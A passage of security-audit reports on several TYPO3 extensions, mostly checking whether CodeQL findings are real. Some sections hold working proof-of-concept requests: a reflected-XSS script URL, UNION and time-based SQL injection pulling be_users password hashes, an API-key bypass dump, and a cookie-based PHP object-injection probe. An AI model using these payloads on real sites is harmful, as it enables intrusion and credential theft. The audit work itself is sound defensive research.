- Registered in the **frontend** middleware stack: `Configuration/RequestMiddlewares.php:18` (`frontend` key), ordered `after` `inject-data-attributes` (which itself runs `after typo3/cms-frontend/backend-user-authentication`).
- The HTML-body injection (Path A) runs **only** when `resolveBackendUser()` returns non-null (`:46–49`): either `AccessControl::isPublicWidgetEnabled()` (a Pro/config opt-in), an authenticated `$GLOBALS['BE_USER']` with ClickMark access, or a valid signed `t3cm_session` cookie. So the injection is **auth-gated / config-gated, not pre-auth.**
- The token-activation branch (Path B) does run pre-auth (`:39–41`, before `$handler->handle()`), but produces only a URL-encoded 302 redirect — no XSS.

## 4. Trigger request
No working XSS request exists. The nominal reflected parameter CodeQL points at:
```
GET /any-page?t3cm_activate=<payload> HTTP/1.1
Host: victim
```
→ returns `302` with `Location:` built via `http_build_query` (percent-encoded),
empty body. The widget-config param `?t=<payload>` (with a valid BE session or
public mode) is emitted only through `htmlspecialchars`. Both encoded.

**Conclusion: FALSE POSITIVE** — all reflected output is JSON-hex-encoded or
htmlspecialchars-escaped; the pre-auth path is a URL-encoded redirect with no
HTML body; the HTML injection is auth/config-gated.

### caretaker_caretaker

#### Security Audit — caretaker/caretaker v1.0.3

**eID handler:** `tx_caretaker` → `EXT:caretaker/Classes/eid/class.tx_caretaker_Eid.php` (registered in `ext_localconf.php`: `$TYPO3_CONF_VARS['FE']['eID_include']['tx_caretaker']` **only if** `$extConfig['eid.']['enabled']`). Default `eid.enabled = 0` (`ext_conf_template.txt`). This is the **central monitoring server** extension; the endpoint is a read-only status reader.

## Summary

The much-feared "unserialize of the request body / serialized test results over the wire" **does not exist in this extension in v1.0.3**. The eID never calls `unserialize()` on request data, never executes tests/commands, and the remote-instance protocol here is transported as **XML → `GeneralUtility::xml2array()`**, not PHP `serialize`. (The historical caretaker deserialization-RCE lives in the *separate* `caretaker_instance` receiver extension, which is not part of this codebase.)

The one **real, concrete finding** is a broken authentication check: `validApiKey()` matches any `fe_users` row whose `tx_caretaker_api_key` is empty, and that column is `TEXT NOT NULL` with no usable default, so ordinary front-end users carry an empty key. An **empty/missing `apiKey` parameter therefore passes the check**, giving an unauthenticated caller full read access to the monitoring tree (node identities, descriptions, states, statistics) whenever the eID is enabled. Two `unserialize()` calls of DB-stored result blobs are reachable from the eID but are second-order (DB/server-sourced, not attacker-controlled pre-auth).

---

## Finding C1 — Authentication bypass via empty API key → monitoring info disclosure (MEDIUM)

- **Severity:** Medium · **Pre-auth:** **Yes** (when `eid.enabled = 1`; opt-in, but that is the intended production configuration for external status polling)
- **Source:** `Classes/eid/class.tx_caretaker_Eid.php:164` — `$apiKey = GeneralUtility::_GP('apiKey');`
- **Sink (auth gate):** `class.tx_caretaker_Eid.php:167-181` —
  ```php
  $res = $GLOBALS['TYPO3_DB']->exec_SELECTquery(
      'uid', 'fe_users',
      'tx_caretaker_api_key = ' . $GLOBALS['TYPO3_DB']->fullQuoteStr($apiKey, 'fe_users'),
      '', '', 1);
  ... return !empty($row['uid']);
  ```
- **Tainted path / root cause:**
  - When `apiKey` is omitted, `_GP()` returns `null`; when sent empty, it is `''`. Either way `fullQuoteStr()` yields the literal `''`, so the WHERE becomes `tx_caretaker_api_key = ''` with `LIMIT 1`.
  - Schema `ext_tables.sql:415`: `tx_caretaker_api_key text NOT NULL`. A MySQL `TEXT` column cannot hold a non-empty default; in the common non-strict mode every `fe_users` INSERT that does not explicitly set the key stores `''`. Thus essentially **every** normal front-end user has an empty key, and the query returns a row.
  - `validApiKey()` returns **true**, so `getEidData()` proceeds. There is no per-key scoping — any "valid" key sees every node reachable via `id2node()`.
- **Exploitability:** high where the eID is enabled and at least one `fe_users` row exists with an empty key (the default state). No credentials required.
- **PoC:**
  ```
  GET /?eID=tx_caretaker&apiKey=&node=instance_1&addNode=1&addResult=1&addTestStatistics=1&format=json
  ```
  (Also works with `apiKey` omitted entirely.) Response is a JSON/XML dump of node id, title, description, test state/message/timestamp, child node ids and per-state test statistics — i.e. the internal monitoring topology and health of the monitored infrastructure. Enumerate `node=instance_1,instance_2,...` / `instancegroup_N` / `test_N` to walk the whole tree.
- **Impact:** disclosure of internal server-monitoring structure and status to any unauthenticated party. No write/command capability via this endpoint.
- **Fix:** reject empty/missing keys before querying; compare against a dedicated, non-empty, hashed secret; do not treat "a row exists" as authorization.

## Finding C2 — Second-order object injection via `unserialize()` of stored result blobs (LOW / theoretical)

- **Severity:** Low · **Pre-auth:** no (data is DB/server-sourced, not from the request)
- **Sinks:**
  - `Classes/repositories/class.tx_caretaker_TestResultRepository.php:249-250` — `new tx_caretaker_ResultMessage($row['result_msg'], unserialize($row['result_values']))` and `unserialize($row['result_submessages'])`.
  - `Classes/repositories/class.tx_caretaker_AggregatorResultRepository.php:265-266` — same pattern.
- **Reachability from eID:** `getEidData()` (`class.tx_caretaker_Eid.php:214/246`) calls `$node->getTestResult()` when `addResult=1` / `addTestStatistics=1`, which routes into the result repositories and can reach `dbrow2instance()` → the `unserialize()` calls above.
- **Why only theoretical:** `result_values` / `result_submessages` are written by the caretaker server itself when persisting test results (`saveTestResult`). Remote-instance results arrive as XML (`InstanceNode::setTestConfigurationOverlay` → `GeneralUtility::xml2array`, line 185; no `unserialize` of remote payloads), so an external attacker cannot place a PHP-serialized gadget there without DB write access or control of a *trusted* monitored instance. It is a stored/gadget-chain risk, not a pre-auth request-body RCE.
- **Note:** the other `unserialize()` calls in the extension (`InstanceNode.php:113`, `pingTestService.php:129`, `TestResultRepository.php:69`, `ext_localconf.php`, `AbstractNotificationService`) all operate on `$GLOBALS['TYPO3_CONF_VARS']['EXT']['extConf']['caretaker']` (admin-set extension config), not on request data.

## Candidate — pre-auth unserialize-of-request / RCE (DISPROVEN for this extension)

- No code path in `caretaker` 1.0.3 passes request input (`_GP`, request body, headers) to `unserialize()`. The eID handler builds a status array and emits JSON/XML only.
- The remote monitoring protocol on this (central/server) side uses XML, not `serialize`. The serialize-over-the-wire RCE historically associated with "caretaker" is in the **`caretaker_instance`** receiver extension (installed on monitored nodes), which is absent here.

## Candidate — command / SQL injection in test execution (DISPROVEN via eID)

- The eID does **not** run tests; it only reads previously stored results, so the ping command (`ping.cli_command`, `### → hostname`) and HTTP/cURL test services are never reachable from the pre-auth request.
- SQL in the eID path is safe: the API-key query uses `fullQuoteStr()` (properly escaped — no SQLi, only the logic flaw of C1), and `?node=` is parsed by `NodeRepository::id2node()` (`class.tx_caretaker_NodeRepository.php:151-177`) which splits on `_` and `(int)`-casts every id part; all downstream `getNode*` queries use `(int)$uid`. No injectable request-derived value reaches a query.

## Version / advisory cross-reference

- v1.0.3 is a TYPO3 8/9-era rewrite. The classic caretaker deserialization advisory concerns the instance-side receiver, not this server-side eID. The `validApiKey()` "empty key matches" logic flaw (C1) is present as shown and is the actionable issue for this release.

**Verdict: no pre-auth unserialize/RCE here. Real bug = broken eID API-key check (empty-key auth bypass → monitoring info disclosure) when the eID is enabled.**

### causal_routing

#### Audit: causal/routing — CodeQL "Reflected XSS" (EidController.php:35)

**Verdict: CONFIRMED (pre-auth reflected XSS).** The eID entry point echoes `$_SERVER['REQUEST_URI']` and `$_SERVER['SERVER_NAME']` into an HTML 404 body with no `htmlspecialchars()` and no non-HTML `Content-Type`. Reachable pre-auth via the registered eID.

- **Extension:** Request Routing Service (Causal Sàrl / Xavier Perseguers)
- **Version:** 0.5.0, state `beta` (`ext_emconf.php:18,24`), TYPO3 8.7, PHP 7.2–7.4
- **Sink:** `Classes/Controller/EidController.php:35` (`echo <<<HTML` heredoc), interpolating `{$_SERVER['REQUEST_URI']}` at `:41` and `{$_SERVER['SERVER_NAME']}` at `:43`.

---

## Tainted chain

1. **Registration (pre-auth entry):** `ext_localconf.php:7`
   ```php
   $GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include'][$_EXTKEY] = 'EXT:routing/Classes/Controller/EidController.php';
   ```
   eID scripts execute before any FE user authentication — fully pre-auth, remote.

2. **Dispatch returns null on no route match:** `EidController.php:23-33`
   ```php
   $routing = GeneralUtility::makeInstance(RoutingController::class);
   $ret = $routing->dispatch();
   ...
   if ($ret === null) {              // :33  no matching route → 404 branch
       header('HTTP/1.0 404 Not Found');
   ```
   `RoutingController::dispatch()` (RoutingController.php:64+) sets `$controllerParameters = null` and only populates it when a global route or `EXT:<key>/Configuration/Routes.yaml` matches the `route` GET param. With no `route` param (or an unknown one) it returns `null`, entering the 404 branch trivially.

3. **Sink — unescaped reflection into HTML:** `EidController.php:35-46`
   ```php
   echo <<<HTML
   ...
   <p>The requested URL {$_SERVER['REQUEST_URI']} was not found on this server.</p>   // :41
   <address>Routing Service at {$_SERVER['SERVER_NAME']}</address>                     // :43
   HTML;
   ```
   - `$_SERVER['REQUEST_URI']` is raw request input (path + query string) — attacker-controlled.
   - No `htmlspecialchars()` / `htmlentities()` on either value.
   - No `Content-Type: application/json` (or any) header is set before the `echo`; response defaults to `text/html`, so injected markup is parsed and executed.

## Exact request to trigger

```
GET /index.php?eID=routing&x="><script>alert(document.domain)</script> HTTP/1.1
Host: victim.example
```
(equivalently `/?eID=routing&...`). `dispatch()` finds no matching `route`, returns `null`, and the 404 body reflects the full `REQUEST_URI` — including `"><script>...</script>` — into `text/html`, executing in the victim's browser.

Notes:
- Delivering the payload via the query string avoids browser path-encoding of `<`/`>`; non-browser clients and some referrers reflect the path verbatim as well.
- `SERVER_NAME` (`:43`) is a secondary reflection (Host-derived on some server configs), same missing-escaping issue.

## Verdict

**CONFIRMED — pre-auth reflected XSS.** Request input (`$_SERVER['REQUEST_URI']`) reaches an HTML `echo` sink unsanitized on a pre-auth eID endpoint. Fix: `htmlspecialchars($_SERVER['REQUEST_URI'], ENT_QUOTES)` (and same for `SERVER_NAME`), or emit a non-HTML content type. Version 0.5.0.

### chrisgruen_realty-manager

#### Security Audit — chrisgruen/realty-manager (Realty Manager) v4.0.0

TYPO3 Extbase real-estate manager. Frontend plugin `RealtyManager / Immobilienmanager`
(Extbase signature `tx_realtymanager_immobilienmanager`) exposing the actions
`list, form, search, detail, ajaxselectdistrict, ajaxsearch` — all reachable by an
**unauthenticated website visitor** (no FE login required).

## Summary

Two **pre-auth SQL injection** vulnerabilities confirmed. Both are exploitable by any
anonymous visitor to a page containing the plugin. Frontend search parameters flow
directly into string-concatenated SQL executed via `Connection::executeQuery()`.
CodeQL's SQLi candidates are **real, not false positives** — the safe queries in the
repository use `createNamedParameter()`, but several methods build raw SQL by string
concatenation of request data.

| # | Severity | Pre-auth | Type | Sink |
|---|----------|----------|------|------|
| 1 | Critical | Yes | SQL injection (string-quoted) | `ObjectimmoRepository::getDistricts()` |
| 2 | Critical | Yes | SQL injection (numeric context) | `ObjectimmoRepository::getAllObjectsBySearch()` |
| 3 | Low | Yes | IDOR (public detail records) | `RealtyManagerController::detailAction()` |

---

## Finding 1 — Pre-auth SQL injection via `cityId` (ajaxselectdistrict)  [CRITICAL]

- **PRE-AUTH:** Yes (public FE plugin action).
- **Source:** `Classes/Controller/RealtyManagerController.php:240`
  `$cityId = isset($_GET['cityId']) ? $_GET['cityId'] : 0;`
- **Sink:** `Classes/Domain/Repository/ObjectimmoRepository.php:170-176`

```php
public function getDistricts($city_id) {
    $sql = "SELECT uid, title from tx_realtymanager_domain_model_districts
            WHERE city = '".$city_id."' order by title";
    $districts = $connection->executeQuery($sql)->fetchAll();
```

- **Tainted path:** `$_GET['cityId']` → `ajaxselectdistrictAction()` → `getDistricts($cityId)`
  → concatenated **inside single quotes** in raw SQL → `executeQuery()`. No cast, no
  quoting, no `createNamedParameter`.
- **Exploitability:** Trivial. The value sits in a quoted string context, so a single
  quote breaks out. UNION-based extraction works directly (query selects `uid, title`,
  2 columns).
- **PoC:**
  ```
  /index.php?id=<pluginPageId>
    &tx_realtymanager_immobilienmanager[controller]=RealtyManager
    &tx_realtymanager_immobilienmanager[action]=ajaxselectdistrict
    &cityId=0' UNION SELECT username,password FROM be_users-- -
  ```
  Rendered into the `Ajaxselectdistrict.html` option list → data exfiltration
  (e.g. `be_users` / `fe_users` hashes). Also usable blind (`0' AND SLEEP(5)-- -`).

---

## Finding 2 — Pre-auth SQL injection in search filter (search/list/ajaxsearch)  [CRITICAL]

- **PRE-AUTH:** Yes (public FE plugin actions `search`, `list`, `ajaxsearch`).
- **Source:** `RealtyManagerController.php:131/157/175` `$form_data = $this->request->getArguments();`
  plus `:179-180` `$form_data['district'] = $_POST['district'];`
- **Sink:** `ObjectimmoRepository.php:23-77` (`getAllObjectsBySearch`)

```php
$house_type = isset($form_data['house_type']) ? $form_data['house_type'] : 0;
...
if($house_type > 0) {$add_where .= ' AND house_type = '.$house_type.'';}
if($apartment_type > 0){$add_where .= ' AND apartment_type = '.$apartment_type.'';}
if($employer_page > 0){$add_where .= ' AND obj.pid = '.$employer_page.'';}
if ($city > 0) {$add_where .= ' AND city = '.$city.'';}
if ($district > 0){$add_where .= ' AND district = '.$district.'';}
...
$sql = "SELECT ... WHERE ... $add_where ORDER BY obj.uid DESC $add_limit";
$objects = $connection->executeQuery($sql)->fetchAll();
```

- **Tainted params:** `house_type`, `apartment_type`, `employer`, `city`, `district`
  are concatenated **with no numeric cast and no quoting** (unlike `rent_*` /
  `living_area_*`, which are guarded by `is_numeric()`). `district` is additionally
  taken straight from `$_POST['district']`.
- **Guard bypass:** The only gate is `if($city > 0)`. Under PHP's loose comparison a
  payload beginning with a digit (e.g. `1 AND ...` / `1) UNION ...`) satisfies
  `<string> > 0` in both PHP 7 (numeric leading `1`) and PHP 8 (string compare
  `"1..." > "0"`), so tainted text passes through into the WHERE clause.
- **Exploitability:** Numeric injection context (no quotes to escape). UNION/boolean/
  time-based all viable; the SELECT is `SELECT *,...` so column count is large — blind
  boolean/time-based is the reliable route.
- **PoC (time-based, via search action):**
  ```
  /index.php?id=<pluginPageId>
    &tx_realtymanager_immobilienmanager[controller]=RealtyManager
    &tx_realtymanager_immobilienmanager[action]=search
    &tx_realtymanager_immobilienmanager[city]=1 AND (SELECT 1 FROM (SELECT SLEEP(5))x)
  ```
  or via `ajaxsearch` with POST body `district=1 AND SLEEP(5)`.

Note: search parameters are also persisted into the FE session
(`fe_user->setKey('ses','search'/'ajaxsearch', $form_data)`) and re-read on paging,
so the payload re-executes on subsequent `ajaxsearch` page requests.

---

## Finding 3 — IDOR on detailAction (LOW / informational)

- `detailAction(Objectimmo $objUid)` (`:252`) resolves an arbitrary object `uid`
  supplied by the visitor and also loads its `pid`-based employer record. There is no
  ownership/visibility check beyond Extbase's storage-pid enforcement. Because listings
  are public content this is largely informational, but a visitor can address objects
  outside the configured display context by uid. Related raw-concat queries
  `getImages($uid)` (`:92`) and `getEmployer($pid)` (`:82`) receive values from the
  validated `Objectimmo` model (integer uid/pid from DB), so they are **not**
  independently injectable from the request.

---

## Not vulnerable / false positives

- `Classes/ViewHelpers/*ViewHelper.php` — all use `->createNamedParameter()` /
  `\PDO::PARAM_INT`; parameterized, safe.
- `getPidEmployer`, `getObject`, `getRealitionUid`, `getFileUid` — QueryBuilder with
  named parameters; safe.
- `PaginationAjax/PerPage.php` — `$_GET['page']` is only ever used in **arithmetic**
  contexts (`$_GET["page"]-1`, comparisons); numeric coercion prevents XSS/SQLi.
- Import path (`OpenImmoImport`, `XmlConverter`) — backend scheduler task, not
  request-reachable pre-auth. The raw-concat methods there (`checkOwnerAnid`,
  `setNewObject`, `clearSysFiles`) are fed from parsed OpenImmo XML during import, not
  from HTTP requests.

## Advisory cross-reference

No published TYPO3 security advisory (TYPO3-EXT-SA) was identified for this extension;
Findings 1 and 2 appear to be previously unreported. Remediation: use
`createNamedParameter()` / `(int)` casts for every request-derived value in
`ObjectimmoRepository`.

### communiacs_dd-googlesitemap

#### Security Audit — `communiacs/typo3-dd-googlesitemap` (Fork B)

## Verdict: FALSE POSITIVE / HARDENED — no pre-auth SQLi

Same codepath as Fork A. The historically SQLi-prone vectors (`pidList`, `L`,
`offset`, `limit`, `singlePid`) all reach the raw `TYPO3_DB` query through
integer-casting / integer-validation guards. No unescaped request value is
concatenated into SQL.

- **Extension version:** `2.1.7` (ext_emconf.php)
- **TYPO3 compat:** `6.2.0-8.999.999` (composer: `>=6.2.0,<9.0.0`, php `>=5.3.2`)
- **Note:** older release line than Fork A (2.1.7 vs 2.3.2), but the
  security-relevant generator/eID code is **byte-identical** to Fork A
  (verified via `diff` on `EntryPoint.php`, `AbstractSitemapGenerator.php`,
  `TtNewsSitemapGenerator.php` — all IDENTICAL). The hardening is already present
  in this version.

## 1. eID registration → handler

`ext_localconf.php:8`
```php
$GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include']['dd_googlesitemap'] = 'EXT:dd_googlesitemap/Classes/Generator/EntryPoint.php';
```
`EntryPoint.php` runs PRE-AUTH (eID). `EntryPoint::getSitemapType()` reads
`GeneralUtility::_GP('sitemap')` (`EntryPoint.php:70`) and uses it only as an
**array key** into the dispatch table (`EntryPoint.php:52`) — not into SQL.
Registered generators (`ext_localconf.php:22-23`):
- `sitemap=pages` → `PagesSitemapGenerator::main` (no raw SQL)
- `sitemap=tt_news` → `TtNewsSitemapGenerator::main` (raw SQL sinks)

## 2. Raw SQL sinks and backward taint trace

### Sink 1 — main news query, `TtNewsSitemapGenerator.php:112-118`
```php
$res = $GLOBALS['TYPO3_DB']->exec_SELECTquery('*',
    'tt_news', 'pid IN (' . implode(',', $this->pidList) . ')' .
    ($this->isNewsSitemap ? ' AND crdate>=' . (time() - 48*60*60) : '') .
    $languageCondition .
    $this->cObj->enableFields('tt_news'), '', 'datetime DESC',
    $this->offset . ',' . $this->limit
);
```

| WHERE/arg fragment | Source | Sanitizer | Result |
|---|---|---|---|
| `implode(',', $this->pidList)` | `_GP('pidList')` → `TtNewsSitemapGenerator.php:205` | `GeneralUtility::intExplode(',', …)` casts each element to int; per-element `if ($pid && isInRootline($pid))` filter (`:207-210`) | integers only — **safe** |
| `$languageCondition` = `' AND sys_language_uid=' . $language` (`:108`) | `_GP('L')` → `TtNewsSitemapGenerator.php:106` | gated by `if (MathUtility::canBeInterpretedAsInteger($language))` (`:107`) | **safe** (fix for the historic `L` SQLi) |
| `$this->offset` / `$this->limit` | `_GET('offset')` / `_GET('limit')` → `AbstractSitemapGenerator.php:79-80` | `max(0, (int)…)` | **safe** |
| `crdate>=` … | server `time()` | n/a | **safe** |

### Sink 2 — category lookup, `TtNewsSitemapGenerator.php:154-160`
```php
$res = $GLOBALS['TYPO3_DB']->exec_SELECT_mm_query(
    'tt_news_cat.single_pid','tt_news','tt_news_cat_mm','tt_news_cat',
    ' AND tt_news_cat_mm.uid_local = ' . intval($newsId));
```
`$newsId` = `$row['uid']` (DB value, not request) and wrapped in `intval()`. **Safe.**

`singlePid` (`_GP('singlePid')`, `:91`) → `intval()`; `useCategorySinglePid`
(`:93`) → `(bool)`. Neither reaches SQL unescaped.

### Out of pre-auth scope
`Classes/Scheduler/AdditionalFieldsProvider.php:193-194` uses a raw
`exec_SELECTgetRows` on `sys_domain` but is a **backend Scheduler** component
(not eID) and escapes with `$GLOBALS['TYPO3_DB']->fullQuoteStr(...)`. Not
exploitable pre-auth.

## 3. Trigger request (for confirmation testing — expected NOT injectable)
```
GET /?eID=dd_googlesitemap&sitemap=tt_news&type=news&pidList=1,2,3&L=0&offset=0&limit=100
```
`&L=1 OR 1=1`, `&pidList=1) UNION SELECT ...`, `&offset=1;DROP` are neutralized by
`canBeInterpretedAsInteger` / `intExplode` / `(int)` respectively.

## Conclusion
Despite being the lower version number (2.1.7), this fork already contains the
same integer-guarded query code as Fork A. All request-derived values entering
raw `TYPO3_DB` queries are integer-cast or integer-validated. **No confirmed
pre-auth SQL injection.**

### creativekallol_ck-faq

#### Target A — creativekallol_ck-faq — `FaqRatingViewHelper.php:59`

## Verdict: **CONFIRMED pre-auth PHP object injection (POI)**

Attacker-controlled cookie bytes reach a raw `unserialize()` with **no `allowed_classes` restriction**, rendered by an anonymous frontend plugin.

## Source → sink chain

`Classes/ViewHelpers/FaqRatingViewHelper.php`
```
:52   $cookieName = 'faq_rating_' . $faqId;          // $faqId = (int) faq.uid
:54   if (empty($_COOKIE[$cookieName])) return '';    // SOURCE: $_COOKIE (attacker-controlled)
:58   $decoded = urldecode($_COOKIE[$cookieName]);
:59   $cookie  = @unserialize($decoded);              // SINK: raw unserialize of attacker bytes
:61   if (!is_array($cookie) || empty($cookie['rate'])) return '';
```

The cookie name is fully predictable: `faq_rating_<uid>` where `<uid>` is the FAQ record UID rendered on the page. The value is 100% attacker-controlled (browser cookie), passed through `urldecode()` then directly into `unserialize()`.

## allowed_classes: **NOT set (raw)**

`@unserialize($decoded)` — the leading `@` only suppresses PHP warnings; it does **not** restrict object instantiation. No `['allowed_classes' => false]` second argument. So arbitrary object graphs are instantiated → object-injection primitive is real. The subsequent `is_array()` check happens *after* unserialize has already constructed the objects, so `__wakeup`/`__destruct` side effects fire regardless of the array check.

## Gadget

No `__destruct` / `__wakeup` / `__toString` gadget exists inside ck-faq itself (grep clean). This does not reduce severity: the extension targets **TYPO3 v13.4**, whose runtime (TYPO3 core, Symfony components, Guzzle, doctrine, etc.) routinely ships POP-chain gadgets. The extension provides the injection primitive; the surrounding platform provides gadgets. Flagged as a confirmed primitive.

## Reachability / auth level: **anonymous frontend (pre-auth)**

- `ext_localconf.php` registers plugin `CkFaq/Pi1` (`FaqController::list`) as a `PLUGIN_TYPE_CONTENT_ELEMENT`.
- `Resources/Private/Templates/Faq/List.html:50` renders the sink for **every FAQ in the list**:
  ```
  {namespace ckfaq=Creativekallol\CkFaq\ViewHelpers}
  <f:variable name="rating" value="{ckfaq:faqRating(faqId: faq.uid)}" />
  ```
- Any page containing the FAQ list content element renders this ViewHelper once per FAQ. No login, no token, no session required — the ViewHelper reads `$_COOKIE` directly. Reached by any anonymous visitor whose request carries the crafted cookie.

## Trigger

Visit any page showing the FAQ list plugin with a crafted cookie for one of the listed FAQ UIDs (e.g. UID 1):
```
Cookie: faq_rating_1=<urlencoded serialized payload>
```
e.g. a raw object-injection probe: `faq_rating_1=O%3A8%3A%22stdClass%22%3A0%3A%7B%7D` (`O:8:"stdClass":0:{}`). Replace `stdClass` with any gadget class available in the TYPO3 v13 runtime to drive a POP chain.

## Version

- ck-faq **1.0.0** (state: stable), `ext_emconf.php`.
- TYPO3 constraint: `typo3 => 13.4.0-13.4.99`.

### cundd_rest

#### cundd/rest — CodeQL "Code injection" @ DataProvider.php:177 / :182

**Verdict: FALSE POSITIVE (not code injection / not RCE).**

Extension: `cundd_rest` (title "rest"), **version 5.1.0** (`ext_emconf.php`).

## Sink

`Classes/DataProvider/DataProvider.php`, method `getModelProperty(object $model, string $propertyParameter)`:

```php
175  $normalizedGetter = 'get' . ucfirst($propertyKey);
176  if (method_exists($model, $normalizedGetter) && is_callable([$model, $normalizedGetter])) {
177      return $this->getModelData($model->$normalizedGetter());   // sink 1
178  }
179
180  $getter = 'get' . ucfirst($propertyParameter);
181  if (method_exists($model, $getter) && is_callable([$model, $getter])) {
182      return $this->getModelData($model->$getter());             // sink 2
183  }
```

Dangerous op: **dynamic method call** `$model->$method()`. CodeQL flags the variable method name.

## Why it is NOT code injection / RCE

The method name is **not an attacker-chosen arbitrary callable**. Three independent constraints defang it:

1. **Hardcoded `get` prefix.** The invoked name is always `'get' . ucfirst($propertyKey)` (or `$propertyParameter`). An attacker can only ever reach methods whose name begins with `get`. `system`, `exec`, `passthru`, `__construct`, `unserialize`, etc. are unreachable. `$propertyKey` is additionally run through `convertPropertyParameterToKey()` (`ucwords`/`str_replace` on `_`/`-`/space), so it cannot inject `::`, `(`, or a leading character to escape the prefix.
2. **`method_exists($model, …) && is_callable([$model, …])` guard.** The `getXxx` method must actually exist and be publicly callable on `$model`.
3. **Fixed receiver, zero arguments.** `$model` is a concrete Extbase domain model whose class is derived from the URL resource type (`getModelClassForResourceType`), not from attacker-supplied class identity — there is no `new $cls` / `call_user_func($userString)`. The call passes **no arguments**.

Net capability: an unauthenticated caller (if the endpoint is opened, see below) can invoke an existing **zero-argument public getter** on the model and receive its serialized value. That is exactly the documented feature of the route `GET /rest/{ResourceType}/{id}/{property}` — read one property. It is a read primitive, not arbitrary code/command execution. No control over callable identity, class identity, or arguments ⇒ **no RCE**.

## Taint chain (request → sink), informational

- Route registered in `Classes/Handler/CrudHandler.php:202`:
  `Route::get($resourceType . '/{slug}/{slug}/?', [$this, 'getProperty'])`.
- `CrudHandler::getProperty(RestRequestInterface $request, string $identifier, string $propertyKey)` (line 63) — `$propertyKey` is the **2nd path slug**, request-controlled.
- `CrudHandler.php:72` → `$dataProvider->getModelProperty($model, $propertyKey)`.
- `DataProvider::getModelProperty()` → sink lines 177/182.

So the tainted value is a **property name from the URL path**, coerced into a `get<Name>()` getter — confirming the sink is a whitelisted-shape getter dispatch, not an arbitrary-callable injection.

## Reachability / auth

- The route lives on cundd/rest's public frontend REST dispatcher. Whether it is reachable at all is gated by the `paths.*.read` access configuration (TypoScript `plugin.tx_rest.settings.paths`). Default policy denies access unless the site operator grants `read` (e.g. `access: allow` / `requireApiToken`) for the resource type. The sink needs at minimum a configured, read-permitted resource type.
- Even with a fully public `read` grant, the capability remains "call an existing zero-arg getter" — not RCE.

## Trigger (illustrative, harmless)

```
GET /rest/MyExt-MyModel/1/someProperty
```
resolves to `$model->getSomeProperty()`. Substituting `someProperty` cannot escape the `get…()` getter shape.

**Conclusion: FALSE POSITIVE — bounded getter dispatch (get-prefixed, method_exists/is_callable-guarded, fixed model, no args). Not pre-auth RCE.**

### cylancer_download_library

#### Security Audit — cylancer/cy_download_library

- Extension key: `cydownloadlibrary`
- Version: 3.1.0 (`ext_emconf.php`)
- Platform: TYPO3 v13.4, Extbase frontend plugin `DocumentBoard`
- Scope: path traversal / arbitrary file read, access-control bypass on protected
  downloads, predictable download tokens

## Summary

No concrete path-traversal / arbitrary-file-read or token vulnerability found.
Downloads are rendered as ordinary public FAL links (`<f:link.file>`); the extension
has **no readfile/dumpFile sink, no file-id/path download action, and no download
tokens** — so the traversal and token classes do not apply. Write/delete actions are
gated by an owner check. The one noteworthy issue is a **design-level access
exposure**: the document listing and its file links are shown to every visitor
without any frontend-user-group restriction, so if `documentsFolder` is a public
storage the files are effectively unauthenticated downloads — but this is inherent to
storing in a public FAL storage, not a code traversal bug.

## Entry points

`ext_localconf.php` registers plugin `DocumentBoard` with actions
`show, upload, removeDocument, archiveDocument` (all non-cacheable). No eID/AJAX.

## Findings

### 1. Path traversal / arbitrary file read via file id or path — NOT VULNERABLE
- SEVERITY: n/a  PRE-AUTH: n/a
- There is no download controller action and no filesystem read sink. The template
  serves files with
  `<f:link.file file="{document.file.originalResource.originalFile}">`
  (`Resources/Private/Templates/DocumentBoard/Show.html:42,187`), i.e. a FAL
  public-URL link. No request parameter is used to look up a file by path/id for
  reading. `grep` for `readfile|dumpFile|file_get_contents|fopen|getContents` in
  `Classes/` returns nothing relevant. Traversal class disproven.

### 2. Access-control bypass on protected downloads — DESIGN EXPOSURE (not a code bug)
- SEVERITY: Low/Informational  PRE-AUTH: yes (viewing), by design
- `showAction()` assigns `documentRepository->getSortedDocuments()`
  (`DocumentBoardController.php:72-76`), and `getSortedDocuments()`
  (`DocumentRepository.php:19-43`) returns **all** documents with no
  frontend-user-group filtering. The template renders public FAL file links for
  every document to every visitor. Only the *add* form is gated (`canAddDocuments`,
  `:79-84`) and *remove/archive* buttons are shown only to the owner
  (`Show.html:78,94`). Consequence: if the configured `documentsFolder` lives in a
  public storage (e.g. `fileadmin`), documents are downloadable by anonymous users.
  This is a configuration/design property of storing files in a public FAL storage,
  not a traversal or broken-token flaw; no per-document ACL is claimed by the code.

### 3. Predictable download tokens — NOT APPLICABLE
- No token scheme exists; downloads are direct FAL URLs. Nothing to predict/forge.

### 4. Owner-check on removeDocument / archiveDocument — ADEQUATE (no IDOR)
- `removeDocumentAction(Document $document)` (`:88`) and `archiveDocumentAction`
  (`:121`) both call `validateRemove()/validateArchive()` which enforce
  `frontendUserService->getCurrentUserUid() !== $document->getOwner()->getUid()`
  (`:114`, `:143`). A non-owner (or anonymous, where `getCurrentUserUid()` returns
  falsy) fails the check and no mutation occurs. The deleted file UID comes from the
  DB-loaded `$document->getFile()->getUid()` (`:95`), not from raw request input;
  overriding the `file` relation via extra POST keys is blocked by Extbase trusted-
  properties (the remove form exposes only `__identity`). No arbitrary-file delete.
- Minor code smell: `FrontendUserService::getCurrentUserUid(): int` returns `false`
  when not logged in (`FrontendUserService.php:45-51`) — type-inconsistent but fails
  safe for the comparisons above.

### 5. Upload — restricted, no RCE
- `initializeUploadAction()` attaches a `MimeTypeValidator` limited to
  pdf/jpeg/png/txt/odt/ods/odp (`:41-49,153-172`), max 1 file, folder =
  `settings['documentsFolder']` (TypoScript, not request), `DuplicationBehavior::RENAME`.
  Combined with core `fileDenyPattern`, no `.php` upload / RCE path.

## Cross-reference

No public TYPO3-EXT-SA known for this extension/version. Assessment from source
review of v3.1.0.

## Conclusion

No path-traversal, arbitrary-file-read, or token vulnerability. The only actionable
recommendation is authorization/design: restrict the document listing and its file
storage to the intended frontend user group if downloads are meant to be protected.

### datamints_feuser

#### Security Audit — datamints / datamints_feuser (Frontend User Management)

- **File:** `pi1/class.tx_datamintsfeuser_pi1.php`
- **Version:** 0.12.5 — `ext_emconf.php` constraint `typo3 => 6.2.0-10.99.99` (requires `typo3db_legacy`)
- **Type / reachability:** Frontend plugin (`extends AbstractPlugin`). `showtype=register` is **anonymous** (login gate at line 162 only applies to `showtype=edit`). `showtype=edit` requires a logged-in FE user.

## Findings

### 1. Usergroup mass-assignment → privilege escalation on registration — CONFIRMED (config-dependent / NEEDS-CONFIG)

**Tainted chain:**
- Input: `piVars[$contentId]['usergroup']` (anonymous POST).
